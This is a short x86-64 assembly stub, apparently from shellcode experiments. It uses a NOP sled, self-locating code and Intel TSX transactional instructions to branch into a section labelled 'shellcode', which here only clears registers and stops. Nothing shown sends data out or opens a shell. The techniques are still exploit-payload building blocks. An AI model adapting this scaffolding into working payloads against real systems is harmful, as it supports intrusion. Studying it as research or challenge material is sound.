%idefine rip rel $

global _start
    _start:
    db  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
    db  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
    lea rdi, [rip]
    sub rdi, 0x14
    ; The following two instructions don't obviously do anything useful
    ; but without them, the transaction always fails !!!
    ; Maybe be some cache-related stuff
    mov dword eax, [rdi]
    mov dword [rdi], eax
    xor rax, rax
    xor rcx, rcx
    xor rdx, rdx
    xor rsi, rsi
    ;xor r8, r8
    ;xor r9, r9
    ;xor r10, r10
    ;xor r11, r11
    ;xor r12, r12
    ;xor r13, r13
    ;xor r14, r14
    ;xor r15, r15
    ;xor rsi, rsi
    xacquire lock xor dword [rdi], ebx
    xtest
    jnz shellcode
    ret

    shellcode:
    xor rbp, rbp
    xor rsp, rsp
    xor rdi, rdi
    xor rbx, rbx
    
